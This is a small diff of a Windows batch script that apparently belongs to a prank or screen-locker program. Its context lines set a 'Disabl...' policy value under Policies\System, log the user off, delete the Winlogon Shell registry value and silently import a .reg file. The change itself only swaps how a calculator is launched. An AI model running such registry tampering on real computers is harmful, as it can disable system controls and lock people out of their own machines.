@@ -18,9 +18,10 @@ reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v Disabl
 shutdown -l
 exit
 :init
-start python\pythonw calc.py
+start calculator.exe
 start python\pythonw anticheat.py
 reg add "HKCU\Control Panel\Desktop" /v Wallpaper /f /d "%cd%\Untitled2.png"
+cls
 python\python skid.py
 reg delete "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /f
 regedit /s "%cd%\fix.reg"
